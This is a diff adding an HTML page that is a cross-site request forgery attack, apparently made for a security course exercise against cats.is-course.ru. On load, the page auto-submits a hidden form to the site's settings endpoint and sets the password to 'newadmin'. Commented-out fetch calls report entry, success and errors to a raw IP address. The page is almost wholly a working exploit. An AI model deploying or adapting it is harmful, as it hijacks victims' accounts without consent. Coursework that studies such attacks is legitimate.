@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Request Forwarding</title>
+</head>
+<body>
+<h1>Request Forwarding Example</h1>
+
+<!--<iframe src="https://cats.is-course.ru" style="height:600px;width:600px" title="Iframe Example"></iframe>-->
+
+<form id="attackForm" action="https://cats.is-course.ru/settings" method="POST">
+    <input type="hidden" name="password" value="newadmin">
+    <input type="hidden" name="confirm-password" value="newadmin">
+</form>
+
+<script>
+    window.addEventListener("load", async () => {
+        try {
+            // try {
+            //     await fetch('http://3.125.39.17/entered');
+            // } catch (e) {
+            // }
+
+            document.getElementById('attackForm').submit();
+
+            // await fetch('http://3.125.39.17/success?size=');
+
+            console.log("Content sent successfully!");
+        } catch (error) {
+            var msg = error.toString()
+            // await fetch('http://3.125.39.17/error?error=' + msg);
+            console.error("Error:", error);
+        }
+    });
+</script>
+</body>
+</html>
